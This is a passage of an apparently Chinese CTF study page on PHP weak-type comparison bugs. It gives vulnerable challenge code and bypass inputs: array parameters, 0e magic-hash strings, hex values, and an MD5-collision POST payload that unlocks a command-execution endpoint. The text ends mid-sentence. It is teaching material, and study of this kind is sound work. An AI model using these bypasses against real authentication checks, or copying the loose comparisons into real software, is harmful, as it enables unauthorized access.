class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要得到flag，得想办法让a和b的值不相等，但md5加密后的<strong>值</strong>相等。</p><p>由于<strong>md5或者sha不能加密数组，所以在加密数组的时候会返回false。</strong></p><p>利用这点，给a和b分别传参两个不同的数组，就可以得到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure><h3 id="十六进制比较问题"><a href="#十六进制比较问题" class="headerlink" title="十六进制比较问题"></a>十六进制比较问题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">$number</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $one = ord(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">    $nine = ord(<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">    &#123;  </span><br><span class="line">        $digit = ord($number&#123;$i&#125;);</span><br><span class="line">        <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $number == <span class="string">&#x27;54975581388&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( fun($_GET[<span class="string">&#x27;a&#x27;</span>]) )</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Wrong&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>ord() 函数返回字符串的首个字符的 ASCII 值。</p></blockquote><p>这道题的意思就是要求输入一个key，然后这个key必须等于<code>54975581388</code>，但是在自定义的函数里面又不允许出现数字1到9，正好<code>54975581388=0xccccccccc</code>这样就绕过了检测。</p><p><strong>“0x”开头跟数字的字符串（例如”0x1e240”）会被当作16进制数去比较。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="number">0x1e240</span> == <span class="number">123456</span>);</span><br><span class="line">var_dump(<span class="number">54975581388</span> == <span class="number">0xccccccccc</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>bool(true)<br>bool(true)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;0xccccccccc</span><br></pre></td></tr></table></figure><h3 id="hash值和字符串“0”比较"><a href="#hash值和字符串“0”比较" class="headerlink" title="hash值和字符串“0”比较"></a>hash值和字符串“0”比较</h3><p>在比较的时候，当出现xex模式，将会当做科学计数法进行比较。</p><p>而<strong>只要是以0e开头，后面为数字的字符串和字符串0比较值都是相等的，即<code>0e\d+</code>的字符串 == ‘0’ 为true。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str1 = <span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($str1);</span><br><span class="line">var_dump(md5($str1) == <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$str2 = <span class="string">&quot;s224534898e&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($str2);</span><br><span class="line">var_dump(md5($str2) == <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$str3 = <span class="string">&#x27;a1b2edaced&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($str3);</span><br><span class="line">var_dump(md5($str3) == <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>0cc175b9c0f1b6a831c399e269772661<br>bool(false)<br>0e420233178946742799316739797882<br>bool(true)<br>0e45ea817f33691a3dd1f46af81166c4<br>bool(false)</p></blockquote><h3 id="PHP-组合比较运算符"><a href="#PHP-组合比较运算符" class="headerlink" title="PHP 组合比较运算符"></a>PHP 组合比较运算符</h3><p>组合比较运算符，符号为：&lt;=&gt;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$c = $a &lt;=&gt; $b;</span><br></pre></td></tr></table></figure><p>相当于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$c = $a &gt; $b ? <span class="number">1</span> : ( $a==$b ? <span class="number">0</span> : <span class="number">-1</span> );</span><br></pre></td></tr></table></figure><ul><li>当 $a &gt; $b 时，$c = 1</li><li>当 $a == $b 时，$c = 0</li><li>当 $a &lt; $b 时，$c = -1</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="number">1</span>;</span><br><span class="line">$b = <span class="number">2</span>;</span><br><span class="line">$c = $a &lt;=&gt; $b;</span><br><span class="line"><span class="keyword">echo</span> $c;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>-1</p></blockquote><p>组合比较运算符同样存在 == 弱类型比较问题，原理同 <strong>“==”与“===”</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;0e12&#x27;</span>;</span><br><span class="line">$b = <span class="string">&#x27;0e34&#x27;</span>;</span><br><span class="line">$c = $a &lt;=&gt; $b;</span><br><span class="line"><span class="keyword">echo</span> $c;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>0</p></blockquote><h3 id="PHP-strcmp-函数"><a href="#PHP-strcmp-函数" class="headerlink" title="PHP strcmp() 函数"></a>PHP strcmp() 函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> strcmp ( <span class="keyword">string</span> $str1 , <span class="keyword">string</span> $str2 )</span><br></pre></td></tr></table></figure><p>根据ACSII表进行比较，从左到右依次进行，出现不同就停止比较，返回结果。</p><p>如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 二进制安全比较字符串（区分大小写）</span></span><br><span class="line"><span class="keyword">echo</span> strcmp(<span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>-1</p><p>因为’H’的ASCII值比’h’的小，所以返回负数</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password=<span class="string">&quot;***&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strcmp($_GET[<span class="string">&#x27;password&#x27;</span>], $password) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Wrong&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>PHP5.3以上版本的strcmp()存在漏洞，只要$_GET[‘password’]是一个数组或者一个object即可绕过。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?password[]&#x3D;a</span><br></pre></td></tr></table></figure><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="weak-type1"><a href="#weak-type1" class="headerlink" title="weak_type1"></a>weak_type1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$o = $_GET[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($o))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no hack!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($o==<span class="number">520</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?o&#x3D;520a</span><br></pre></td></tr></table></figure><h3 id="weak-type3"><a href="#weak-type3" class="headerlink" title="weak_type3"></a>weak_type3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span>(<span class="params">$number</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $one = ord(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">    $nine = ord(<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">    &#123;  </span><br><span class="line">        $digit = ord($number&#123;$i&#125;);</span><br><span class="line">        <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $number == <span class="string">&#x27;54975581388&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$flag=file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct($_GET[<span class="string">&#x27;key&#x27;</span>]))</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;access denied&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?key&#x3D;0xccccccccc</span><br></pre></td></tr></table></figure><h3 id="weak-type4"><a href="#weak-type4" class="headerlink" title="weak_type4"></a>weak_type4</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">&#x27;a&#x27;</span>] != $_POST[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure><h3 id="weak-type5"><a href="#weak-type5" class="headerlink" title="weak_type5"></a>weak_type5</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $logined = <span class="literal">true</span>;</span><br><span class="line">    $username = $_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = $_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ctype_alpha($username)) &#123;$logined = <span class="literal">false</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span> (!is_numeric($password) ) &#123;$logined = <span class="literal">false</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span> (md5($username) != md5($password)) &#123;$logined = <span class="literal">false</span>;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($logined)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;login failed!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>isset()  检测变量是否设置</p><p>ctype_alpha函数功能就是检测是否是字符</p><p>is_numeric 检测变量是否为数字或数字字符串</p></blockquote><p>username必须是字母，password必须是数字，再将传入的username和password进行md5加密后进行比较且结果要相等。</p><p>如果md5加密后的值是0e开头，这样就存在弱类型比较问题就可以通过，所以要想得到flag，得寻找纯字母和纯数字md5加密后是0e开头的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(md5(<span class="string">&#x27;QNKCDZO&#x27;</span>) == md5(<span class="string">&#x27;240610708&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>bool(true)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;QNKCDZO&amp;password&#x3D;240610708</span><br></pre></td></tr></table></figure><h3 id="weak-type6"><a href="#weak-type6" class="headerlink" title="weak_type6"></a>weak_type6</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$cmd=$_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)$_POST[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>尝试使用<strong>weak_type4</strong>的<code>a[]=1&amp;b[]=2</code>，发现不行，测试后发现数组被强制装换为字符串后都是Array</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_POST[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">$b = $_POST[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;a=&quot;</span>.(<span class="keyword">string</span>)$a.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;b=&quot;</span>.(<span class="keyword">string</span>)$b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>a=Array</p><p>b=Array</p></blockquote><p>参考<a href="https://blog.csdn.net/weixin_41185953/article/details/83786862">MD5碰撞</a>后，用burp suite抓包</p><p><a href="https://imgchr.com/i/BYSB1H"><img src="https://s1.ax1x.com/2020/10/29/BYSB1H.png" alt="BYSB1H.png"></a></p><p><a href="https://imgchr.com/i/BYS5cj"><img src="https://s1.ax1x.com/2020/10/29/BYS5cj.png" alt="BYS5cj.png"></a></p><p><code>a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</code></p><h3 id="天融信面试题"><a href="#天融信面试题" class="headerlink" title="天融信面试题"></a>天融信面试题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;form action&#x3D;&quot;index.php&quot; class&#x3D;&quot;authform&quot; method&#x3D;&quot;post&quot; accept-charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;fieldset&gt;</span><br><span class="line">            &lt;legend&gt;Unbreakable Random&lt;&#x2F;legend&gt;</span><br><span class="line">            &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;s&quot; name&#x3D;&quot;s&quot; value&#x3D;&quot;&quot; placeholder&#x3D;&quot;seed&quot; &#x2F;&gt;</span><br><span class="line">            &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;h&quot; name&#x3D;&quot;h&quot; value&#x3D;&quot;&quot; placeholder&#x3D;&quot;hash&quot; &#x2F;&gt;</span><br><span class="line">            &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Check&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">        &lt;div class&#x3D;&quot;return-value&quot; style&#x3D;&quot;padding: 10px 0&quot;&gt;&amp;nbsp;&lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;fieldset&gt;</span><br><span class="line">        &lt;&#x2F;form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">function gen_secured_random() &#123; &#x2F;&#x2F; cause random is the way</span><br><span class="line">    $a &#x3D; rand(1337,2600)*42;</span><br><span class="line">    $b &#x3D; rand(1879,1955)*42;</span><br><span class="line"></span><br><span class="line">    $a &lt; $b ? $a ^&#x3D; $b ^&#x3D; $a ^&#x3D; $b : $a &#x3D; $b;</span><br><span class="line"></span><br><span class="line">    return $a+$b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function secured_hash_function($plain) &#123; &#x2F;&#x2F; cause md5 is the best hash ever</span><br><span class="line">    $secured_plain &#x3D; sanitize_user_input($plain);</span><br><span class="line">    return md5($secured_plain);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function sanitize_user_input($input) &#123; &#x2F;&#x2F; cause someone told me to never trust user input</span><br><span class="line">    $re &#x3D; &#39;&#x2F;[^a-zA-Z0-9]&#x2F;&#39;;</span><br><span class="line">    $secured_input &#x3D; preg_replace($re, &quot;&quot;, $input);</span><br><span class="line">    return $secured_input;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;source&#39;])) &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">require_once &quot;secret.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;s&#39;]) &amp;&amp; isset($_POST[&#39;h&#39;])) &#123;</span><br><span class="line">    $s &#x3D; sanitize_user_input($_POST[&#39;s&#39;]);</span><br><span class="line">    $h &#x3D; secured_hash_function($_POST[&#39;h&#39;]);</span><br><span class="line">    $r &#x3D; gen_secured_random();</span><br><span class="line">    if($s !&#x3D; false &amp;&amp; $h !&#x3D; false) &#123;</span><br><span class="line">        if($s.$r &#x3D;&#x3D; $h) &#123;</span><br><span class="line">            print &quot;Well done! Here is your flag: &quot;.$flag;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            print &quot;Fail...&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        print &quot;&lt;p&gt;Hum ...&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;p&gt;&lt;em&gt;&lt;a href&#x3D;&quot;index.php?source&quot;&gt;source code&lt;&#x2F;a&gt;&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>其中几个函数的作用</p><ul><li>gen_secured_random()</li></ul><p>虽然不知道<code>$a ^= $b ^= $a ^= $b</code>的结果会是怎么样的，但$a+$b的值的长度都是六位数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">1</span>; $i &lt; <span class="number">100</span>; $i++)&#123;</span><br><span class="line">$a = rand(<span class="number">1337</span>,<span class="number">2600</span>)*<span class="number">42</span>;</span><br><span class="line">$b = rand(<span class="number">1879</span>,<span class="number">1955</span>)*<span class="number">42</span>;</span><br><span class="line">$a &lt; $b ? $a ^= $b ^= $a ^= $b : $a = $b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($a+$b) != <span class="number">6</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;不是6位数&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;i = &quot;</span>.$i;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>i = 100</p></blockquote><ul><li>sanitize_user_input($input)</li></ul><p>对传进来的$input进行过滤，将不是26个字母和数字的字符替换为空</p><ul><li>secured_hash_function($plain)</li></ul><p>调用sanitize_user_input()函数，对传进来的$plain进行过滤，返回过滤后的md5值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$s = sanitize_user_input($_POST[<span class="string">&#x27;s&#x27;</span>]);</span><br><span class="line">$h = secured_hash_function($_POST[<span class="string">&#x27;h&#x27;</span>]);</span><br><span class="line">$r = gen_secured_random();</span><br><span class="line"><span class="keyword">if</span>($s != <span class="literal">false</span> &amp;&amp; $h != <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>($s.$r == $h) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Well done! Here is your flag: &quot;</span>.$flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对传进来的$s，过滤掉其它字符，剩下字母和数字</p><p>$h也过滤掉后进行md5加密</p><p>$r为一个6位数的数</p><p>如果$s和$h都不等于false 以及 